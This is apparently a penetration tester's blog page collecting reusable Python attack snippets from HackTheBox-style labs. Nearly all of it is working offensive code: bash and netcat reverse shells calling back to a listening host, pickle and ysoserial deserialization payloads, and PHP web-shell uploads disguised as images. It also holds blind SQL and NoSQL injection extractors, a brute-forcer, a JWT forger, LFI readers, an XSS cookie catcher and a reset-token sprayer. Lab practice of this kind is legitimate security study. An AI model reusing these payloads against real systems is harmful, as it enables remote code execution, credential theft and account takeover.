---
title: "Python Code Snippets"
tags: [Metodologies]
categories: Metodology
mermaid: true
image: https://www.tshirtgeek.com.br/wp-content/uploads/2021/03/com001.jpg
---

# Python Code

Here will come all the main python snippets code I will use/reuse in my scripts.

# Summary

- [Python Code](#python-code)
- [Summary](#summary)
- [Python Snippets](#python-snippets)
  - [Skeleton](#skeleton)
  - [Handler](#handler)
  - [Web Server](#web-server)
  - [Get Reverse Shell Linux](#get-reverse-shell-linux)
  - [Get CSRF Token](#get-csrf-token)
  - [Brute Force With Security Token](#brute-force-with-security-token)
  - [SQLInjection](#sqlinjection)
  - [Get Current Time (EPOCH)](#get-current-time-epoch)
  - [Trigger Reverse Shell Bash](#trigger-reverse-shell-bash)
  - [Mount ps1 Reverse Shell Payload](#mount-ps1-reverse-shell-payload)
  - [Python Upload File](#python-upload-file)
  - [Python Forge JWT](#python-forge-jwt)
  - [Write Files in Python](#write-files-in-python)
  - [Base64 Python](#base64-python)
  - [Python Pickles](#python-pickles)
  - [YoSoSerial Auto Download](#yososerial-auto-download)
  - [SSH Login](#ssh-login)
  - [Python Pseudo Web Shell](#python-pseudo-web-shell)
  - [Create Shell Payload](#create-shell-payload)
  - [Auto LFI Loop](#auto-lfi-loop)
  - [Receive data nc python](#receive-data-nc-python)
  - [Spray Token](#spray-token)
  - [Samba Interaction](#samba-interaction)

# Python Snippets

Let's jump in.

## Skeleton

Small skeleton in python3

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=False)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=False)
    parser.add_argument('-u', '--username', help='Username to target', required=False)
    parser.add_argument('-p', '--password', help='Password value to set', required=False)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

## Handler

Handler to receive the connection back

```py
import socket, telnetlib
from threading import Thread

# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()
  
# Set up the handler
thr = Thread(target=handler,args=(int(lport),rhost))
thr.start()
```

Handler with python pwn thread

```py
from threading import Thread
from pwn import *

# Handler root which will be opened in thread
def RootHandler(lport):
    root = listen(lport).wait_for_connection()
    root.interactive()

# Set Up the Handler
thr = Thread(target=RootHandler,args=(int(lport),))
thr.start()
```

## Web Server

Setting a web server on port 80

```py
from threading import Thread
import threading                     
import http.server                                  
import socket                                   
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Setting the python web server
def webServer():
    debug = True                                    
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:                                                                                                                                
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True                                                                                 
        thread.start()                                                                                       
    else:                                               
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()

# Set up the web python server
webServer()
```

## Get Reverse Shell Linux

Snippet to get a simple reverse shell in a cmd.php

```py
import base64
import urllib.parse

def getReverse(rhost,lhost,lport):
    print("[+] Now Let's get the reverse shell! [+]")
    reverse = "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    message_bytes = reverse.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    payload = {
    'cmd': 'echo ' + base64_message + '|base64 -d | bash'
}
    payload_str = urllib.parse.urlencode(payload, safe='|')
    url = "http://%s:80/templates/protostar/cmd.php?" %rhost
    r.get(url, params=payload_str, proxies=proxies, cookies=r.cookies)

# Get the rev shell
getReverse(rhost,lhost,lport)
```

## Get CSRF Token

Snippet to get csrf token or any token on the page

```py
# First, we need to get the CSRFToken
def getCSRFToken(rhost):
    # Make csrfMagicToken global
    global csrf_token
    # Make the request to get csrf token
    csrf_page = r.get(login_url, verify=False, proxies=proxies)
    # Get the index of the page, search for csrfMagicToken in it
    index = csrf_page.text.find("tokenCSRF")
    # Get only the csrfMagicToken in it
    csrf_token = csrf_page.text[index:index+128].split('"')[4]
    if csrf_token:
        return csrf_token
    else:
        print("[+] Cannot get the CSRF_TOKEN[+]")
        exit
```

Easy way

```py
import requests
from bs4 import BeautifulSoup

def getCSRFToken(rhost):
    response = r.get(rhost, proxies=proxies, cookies=r.cookies)
    soup = BeautifulSoup(response.text, 'lxml')
    csrf_token_id = soup.select_one('meta[name="csrf-token"]')['content']
    return csrf_token_id
```

Easy Easy Way

```py
# Blunder HackTheBox
import re
import requests

csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
```

## Brute Force With Security Token

Brute force in an app which works with security token

```py
import requests

# Now we make the login requests
def loginRequest(rhost,wordlist,username):
    # Let's iterate trough the wordlist
    file = open(wordlist, "r")
    iter = 0
    for line in file:
        # Get the csrf_token for each request
        getCSRFToken(rhost)
        # Set the proper http request
        line = line.strip()
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Origin": "http://%s" %rhost, "X-FORWARDED-FOR": "%s" %line}
        data = {"tokenCSRF": "%s" %csrf_token, "username": "%s" %username, "password": "%s" %line, "save": ''}
        login = r.post(login_url, headers=headers, cookies=r.cookies, data=data, proxies=proxies)
        if "incorrect" in login.text:
            iter = iter + 1
            os.system('clear')
            print()
            print("[+] Trying %s:%s" %(username,line))
            print("[+] Wrong Password - Attempt Number: %s [+]" %iter, flush=True)
        else:
            os.system('clear')
            print()
            print("[+] Password FOUND!!!!!")
            print("[+] Attempt number: %s" %iter)
            print("[+] Username: %s and Password: %s" %(username,line))
            print()
            break

loginRequest(rhost,wordlist,username)
```

## SQLInjection

Simple code for SQLInjection Blind

```py
import requests

'''Here come the Functions'''
def getVersion(rhost):
    sqli_target = 'https://' + rhost +"/index.php?id=465'"
    limit = 1
    char = 42
    prefix = []
    print("[+] The version of MySQL is.... [+]")
    while(char!=123):
        injection_string = "and ascii(substring(version(),%d,1))= %s -- -" %(limit,char)
        target_prefix = sqli_target + injection_string
        response = r.get(target_prefix,proxies=proxies,verify=False,cookies=r.cookies).text
        # On the if put a error message (not success)
        if "we are very sorry to show" not in response:
            prefix.append(char)
            limit=limit+1
            extracted_char = ''.join(map(chr,prefix))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            char=42
        else:
            char=char+1
            prefix = []

# Let's get the version of it
getVersion(rhost)
```
Blind Sqlinjection

```py
import requests
import string

def userExtract(rhost):
    url = "http://%s" %rhost
    global username
    username = ""
    password = ""
    list = string.ascii_letters
    iterator = 0
    while(iterator < len(list)):
        for c in list[iterator]:
            payload = {
                "username[$regex]": "^"+username+c,
                #"username[$regex]": "^(?!admin)"+username+c,
                "password[$ne]": password
            }
            r = requests.post(url, data=payload, allow_redirects=False, proxies=proxies)
            if r.status_code == 302:
                print(f"[+] Found one more char : {username+c}")
                username += c
                iterator = 0
            else:
                iterator = iterator + 1
    print("[+] Username Fouuuund!! : %s [+]" %username)

# Function to extract the password from the user
def passExtract(rhost,username):
    url = "http://%s" %rhost
    password = ""
    list = string.printable
    iterator = 0
    while(iterator < len(list)):
        for c in list[iterator]:
            # We skip characters that will be interpreted as regex
            if c in ['*', '+', '.', '?', '|', '$']:
                iterator = iterator + 1
                continue
            payload = {
                "username": username,
                "password[$regex]": "^"+password+c
            }
            r = requests.post(url, data=payload, allow_redirects=False, proxies=proxies)
            if r.status_code == 302:
                print(f"[+] Found one more char : {password+c}")
                password += c
                iterator = 0
            else:
                iterator = iterator + 1
    print("[+] Password Fouuuuund!!!!! : %s [+]" %password)
```

```py
import requests
import string

def hashExtract(rhost,username):
    url = "http://%s" %rhost + "/login.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    password = []
    list = string.ascii_letters + string.digits
    limit = 1
    iterator = 0
    print("The hash for username %s is..." %username)
    while(iterator < len(list)):
        for c in list[iterator]:
            payload = "username=%s'AND+substring(password,%s,1)='%s'--+-&password=test" %(username,limit,c)
            res = requests.post(url, data=payload, proxies=proxies, headers=headers)
            if "Try again.." not in res.text:
                password.append(c)
                limit = limit + 1
                sys.stdout.write(c)
                sys.stdout.flush()
                iterator = 1
            else:
                iterator = iterator + 1
                password = []
    print()
    
# Let's get the user hash
hashExtract(rhost,username)
```

```py
import requests

'''Here come the Functions'''
def valueExtract(rhost,user_id):
    url_ori = "http://%s" %rhost + "/item/viewItem.php?id=1+"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    password = []
    token_password = []
    list_number = list(range(1, 151))
    limit = 1
    iterator = 1
    print("[+] The token for username with the user id %s is... [+]" %user_id)
    while(iterator < len(list_number)):
        for c in [list_number[iterator]]:
            payload = "and+ascii(substr((select+token+from+user+where+id+=+%s),%s,1))+=+%s+--+-" %(user_id,limit,c)
            url = url_ori + payload
            res = r.get(url, proxies=proxies, headers=headers, allow_redirects=False)
            if res.status_code == 404:
                c = chr(c)
                password.append(c)
                token_password.append(c)
                limit += 1
                sys.stdout.write(c)
                sys.stdout.flush()
                iterator = 0
            else:
                iterator = iterator + 1
                password = []
                url = url_ori
    print()
    token_change = ''.join(token_password)
    print("[+] Got the token for the user id %s = %s !! [+]" %(user_id,token_change))
```

## Get Current Time (EPOCH)

Sometimes is important to get the current time, to make the exploit working. This snippet gets it right from the Headers.

```py
import datetime
import time
import requests

# First, we must get the correct current time from the server, to avoid erros
def getCurrentTime(rhost):
    url = 'http://' + rhost
    b = r.get(url)
    global currentTime
    currentTime = int((datetime.datetime.strptime(b.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

getCurrentTime(rhost)
```

## Trigger Reverse Shell Bash

Snippet to trigger reverse shell in bash, after upload some .sh file

```py
import requests
import urllib

def reverseShell(rhost):
    print("[+] Now Let's Get The Reverse Shell!!!! [+]")
    payload = "bash /tmp/payload.sh"
    urllib.parse.quote(payload, safe='')
    url = "http://%s:80/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=%s&o=p&min=1" %(rhost,payload)
    headers = {"Upgrade-Insecure-Requests": "1"}
    r.get(url, headers=headers, cookies=r.cookies, proxies=proxies)

reverseShell(rhost)
```

## Mount ps1 Reverse Shell Payload

Snippet to mount the nishang powershell and get it read to be deployed

```py
import os

# Mount the payload
def mountPayload(lhost,lport):
    if os.path.isfile('Invoke-PowerShellTcp.ps1'):
        os.system("rm Invoke-PowerShellTcp.ps1")
    print("[+] Let's download the Nishang reverse [+]")
    os.system("wget -q -c https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1")
    print("[+] Download Ok! [+]")
    print("[+] Let's add the call to reverse shell! [+]")
    file = open('Invoke-PowerShellTcp.ps1', 'a')
    file.write('Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s' %(lhost,lport))
    file.close()
    print("[+] Call added! [+]")

mountPayload(lhost,lport)
```

## Python Upload File

```py
import os
import requests

# Login and upload file in python
def loginAdminUpload(rhost,file):
    url = "http://%s:80/index.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"email": "admin@book.htb", "password": "123456"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    #Once logged in, let's upload the malicious payload
    os.system('echo "aa" > 1.html')
    url = 'http://%s:80/collections.php' %rhost
    data = {'title':'Malicious File', 'author':'0x4rt3mis', 'Upload':'Upload'}
    files = {'Upload':('1.html', open('1.jpg', 'rb'))}
    r.post(url, data=data, files=files, proxies=proxies)
    os.system('rm 1.html')
```

```py
import requests
import os

def getUsername(rhost):
    url = "http://%s/ai.php" %rhost
    os.system('flite -w /tmp/test.wav -voice rms -t  "open single quote space union select space username space from users comment database"')
    multipart_data = {
        'fileToUpload': ('test.wav', open('/tmp/test.wav', 'rb'), "audio/x-wav"),
        'submit' : (None,"Process It")
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)
    os.system('rm /tmp/test.wav ')
```

With magic number hex changed to jpeg

```py
import os
import requests

# Upload Malicious with magic hex changed
def maliciousUpload(rhost):
    url = "http://%s/upload.php" %rhost
    data = b'\xff\xd8\xff\xee\r\n\r\n<?php system($_REQUEST[\"cmd\"]); ?>'
    multipart_data = {
        'image': ('0x4rt3mis.php.jpeg', data, "image/jpeg"),
        'submit' : (None,"Upload Image")
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)
```

```py
import os
import requests

def adminUpload(rhost):
    url = "http://%s/admin/upload" %rhost
    os.system('echo "<?php system(\$_REQUEST[\\"cmd\\"]); ?>" > 1.php')
    files = {'file':('1.php', open('1.php', 'rb'))}
    upload = r.post(url, files=files, proxies=proxies, cookies = {'uuid':'%s' %cookie, 'auth':'%s' %encoded})
    os.system('rm 1.php')
```

```py
import os
import requests

# Upload Malicious with magic hex changed
def maliciousUpload(rhost):
    url = "http://%s/admin/upload_image.php" %rhost
    data = 'GIF98a;<?php system($_REQUEST[\"cmd\"]); ?>'
    multipart_data = {
        'title' : (None," "),
        'image': ('0x4rt3mis.phar', data, "image/gif")
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)

maliciousUpload(rhost)
```

## Python Forge JWT

```py
import os
import jwt

# Now let's create the token
def createToken(lhost):
    print("[+] Let's create the malicious jwt token !! [+]")
    print("[+] Let's creat the key.key !! [+]")
    os.system("openssl genrsa -out key.key 2048 2>/dev/null")
    print("[+] Openssl Key Created !!! [+]")
    private_key = open("key.key", "r")
    private_key = private_key.read().rstrip()
    global encoded
    encoded = jwt.encode(
            {"username": "0x4rt3mis",
            "email":"0x4rt3mis@email.com",
            "admin_cap":"1"},
            private_key,
            algorithm="RS256",
            headers={"kid": "http://%s/key.key" %lhost,
            "typ":"JWT"},
    )
```

```py
#!/usr/bin/env python3
import jwt
from datetime import datetime, timedelta

print(jwt.encode({'name': "admin", "exp": datetime.utcnow() + timedelta(days=7)}, 'secretlhfIH&FY*#oysuflkhskjfhefesf', algorithm="HS256"))
```

## Write Files in Python

```py
def createPayload():
    payload = "a/n"
    payload += "b"
    f = open("demofile2.txt", "a")
	f.write(payload)
	f.close()
createPayload()
```

## Base64 Python

```py
import base64

def b64e(s):
    return base64.b64encode(s.encode()).decode()

def b64d(s):
    return base64.b64decode(s).decode()
```

## Python Pickles

Serializaiton in Python3 pickles

```py
#!/bin/python3
import pickle,base64,os,sys

# Create the Payload in base64
def payload(lhost,lport):
    global COMMAND
    COMMAND = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" %(lhost,lport)
    class PAYLOAD():
        def __reduce__(self):
            return os.system, ("{}".format(COMMAND),)
    global payload
    payload = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")
    payload = str(payload)
```

Serialization in Python2.x

```py
#!/bin/python
import cPickle
import sys
import base64

# Create the Payload in base64
def payload(lhost,lport):
	global COMMAND
	COMMAND = "nc -e /bin/bash %s %s" %(lhost,lport)
	class PickleRce(object):
		def __reduce__(self):
			return (os.system,(COMMAND,))
	global comando
	comando = base64.b64encode(cPickle.dumps(PickleRce()))
	comando = str(comando)
```

## YoSoSerial Auto Download

```py
# Download the yososerial
def downloadPayGen():
    print("[+] Let's test to see if we already have yososerial on the working folder ! [+]")
    output_jar = "ysoserial-master-SNAPSHOT.jar"
    if not os.path.isfile(output_jar):
        print("[+] I did no locate it, let's dowload ! WAAAAAAAIT SOME MINUTES TO COMPLETE IT ! [+]")
        os.system("wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar")
    else:
        print("[+] We already have it, let's exploit !!! [+]")
```

```py
import base64
import os

# b64 things
def b64e(s):
    return base64.b64encode(s.encode()).decode()

# Create the malicious serialized reverse shell payload
def createBin(lhost,lport):
    print("[+] Let's make our payload !!! [+]")
    reverse = "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    reverse = b64e(reverse)
    cmd = "bash -c {echo,%s}|{base64,-d}|{bash,-i}" %(reverse)
    os.system("java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 '%s' > payload.session" %cmd)
    print("[+] Payload Createeeeed !!! [+]")
```

## SSH Login

With Credentials

```py
import os

# Now let's ssh in
def sshLogin(rhost,username,password):
    print("[+] Now, let's ssh in !!!! [+]")
    command = 'sshpass -p "%s" ssh %s@%s /bin/bash' %(password,username,rhost)
    os.system(command)
```

With Key

```py
import os

#Function to connect ssh on the box
def connectSSH(rhost,key):
    print("[+] Done! Now Let's connect!!!! [+]")
    ssh_key = '/tmp/rsa_key'
    f = open(ssh_key, 'w'); f.write(key); f.close()
    os.system('chmod 400 /tmp/rsa_key')
    os.system('sleep 1')
    os.system('ssh -i /tmp/rsa_key roosa@%s' %rhost)
```

## Python Pseudo Web Shell

This mean to be used when you cannot have a interactive web shell

```py
import requests
import urllib

# Start the pseudo shell
def setPseudo(rhost):
    url = "http://%s/shop/vqmod/xml/0x4rt3mis.php" %rhost
    url_prefix = url + "?cmd=echo -n $(whoami)':'$(pwd):$ "
    req = r.get(url_prefix, proxies=proxies)
    prefix = req.text
    url_restore = url
    cmd = ""
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    while cmd != "exit":
        url = url_restore
        cmd = input(prefix)
        cmd = urllib.parse.quote_plus(cmd, safe='\"\'()/')
        data = "cmd=%s" %cmd
        output = r.post(url,headers=headers,data=data,proxies=proxies)
        print()
        print(output.text) 
        prefix = req.text
        url = url_restore

# cmd must be the command injection string
url = "http://10.10.10.207/shop/vqmod/xml/payload.php"
setPseudo(url)
```

## Create Shell Payload

```py
def createShellPayload(lhost,lport):
    print("[+] Let's create our shell payload !! [+]")
    payload = "#!/bin/sh\n"
    payload += "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" %(lhost,lport)
    h = open("shell.sh", "w")
    h.write(payload)
    h.close()
    print("[+] Done, shell file created !! [+]")
createShellPayload(lhost,lport)
```

## Auto LFI Loop

```py
import re
import requests
import base64

def b64d(s):
    return base64.b64decode(s).decode()

def readFile():
    url = "http://backup.forwardslash.htb:80/profilepicture.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    print("[+] Just type exit to exit !!!! [+]")
    prefix = "Reading file: "
    file = ""
    while file != "exit":
        file = input(prefix)
        data = {"url": "php://filter/convert.base64-encode/resource=%s" %file}
        output = r.post(url,headers=headers,data=data,proxies=proxies)
        b64encoded = re.search('</html>\n+.*', output.text).group(0)
        if len(b64encoded) < 9:
            print("[+] File does NOT EXIST !!! Or I can't read it !!! [+]")
        else:
            b64encoded = b64encoded.removeprefix("</html>\n")
            print()
            print(b64d(b64encoded)) 
            print()

# Start the loop
readFile()
```

```py
import requests

def readFile(rhost):
    url = "http://%s:80/includes/bookController.php" %rhost
    print("[+] Type exit to exit ! [+]")
    prefix = "Reading file: "
    file = ""
    while True:
        if file != "exit":
            file = input(prefix)
            data = {"book": "..\%s" %file, "method": "1"}
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
            output = r.post(url,headers=headers,data=data,proxies=proxies)
            if "Warning" in output.text:
                print("[+] File does NOT EXIST !!! Or I can't read it !!! [+]")
            else:
                print(bytes(output.text, "utf-8").decode('unicode_escape').strip('"'))
        else:
            print("[+] Exxxxitting.... !! [+]")
            break

# Read LFI
readFile(rhost)
```

## Receive data nc python

Function to receive data with nc, for example in XSS when we need the admin cookie

```py
import subprocess
import socket

# Function to way the xss be triggered and get the token
def getToken(lhost,lport):
    print("[+] Listener on port %s to receive the token ![+]"%lport)
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((lhost,int(lport)))
    s.listen()
    
    print("[+] Waiting for admin to trigger XSS !!! [+]")
    (sock_c, ip_c) = s.accept()
    get_request = sock_c.recv(4096)
    admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")
    print(admin_cookie)
```

## Spray Token

Spray brute force token

```py
import requests

# Let's spray the token
def sprayToken(rhost):
    print("[+] Let's spray ! [+]")
    url = "http://%s:80/resetpassword.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    f = open("seed_list.txt", "r")
    values = f.readlines()
    for token_value in values:
        token_value = token_value.rstrip()
        data = {"token": "%s" %token_value, "password1": "123456", "password2": "123456"}
        res = r.post(url, headers=headers, data=data, proxies=proxies)    
        if res.headers['Content-Length'] != "578":
            print("[+] Password Changed !! [+]")
            print("[+] Token Used: %s ! [+]" %token_value) 
            print("[+] New password: 123456 [+]")
            break
        else:
            continue
```

## Samba Interaction

Snippet to interact with samba linux share

```py
import urllib
from smb.SMBHandler import SMBHandler

def SambaRead(rhost):
    opener = urllib.request.build_opener(SMBHandler)
    fh = opener.open('smb://%s/Development/cmd1.php' %rhost)
    data = fh.read()
    print(data)
    fh.close()

def SambaUpload(rhost):
    file_fh = open('cmd.php', 'rb')
    director = urllib.request.build_opener(SMBHandler)
    fh = director.open('smb://%s/Development/cmd1.php' %rhost, data = file_fh)
    fh.close()

SambaRead(rhost)
SambaUpload(rhost)
```